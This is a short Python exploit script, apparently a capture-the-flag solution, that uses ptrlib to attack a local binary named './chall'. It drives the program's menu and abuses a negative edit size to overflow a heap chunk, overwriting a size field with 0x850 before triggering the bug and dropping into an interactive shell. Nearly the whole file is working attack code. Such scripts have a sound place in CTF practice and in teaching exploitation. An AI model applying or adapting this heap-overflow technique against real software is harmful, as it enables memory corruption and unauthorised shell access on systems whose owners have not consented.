"""
Heap Overflow
"""

from ptrlib import *

file = "./chall"
e = ELF(file)
#libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
sock = Process(file)
sock.debug = True

def alloc(size):
    sock.sendlineafter("take?\n", "1")
    sock.sendlineafter("be?\n", size)

def resize(index, size):
    sock.sendlineafter("take?\n", "2")
    sock.sendlineafter("resize?\n", index)
    sock.sendlineafter("be?\n", size)

def edit(index, size, buf):
    sock.sendlineafter("take?\n", "3")
    sock.sendlineafter("edit?\n", index)
    sock.sendlineafter("buffer?\n", size)
    sock.sendlineafter("bounds!\n", buf)

alloc("18")
edit("0", "-1", b"A"*24+p64(0x850)+b"Ez W\x00")

sock.sendlineafter("take?\n", "4")

sock.sh()
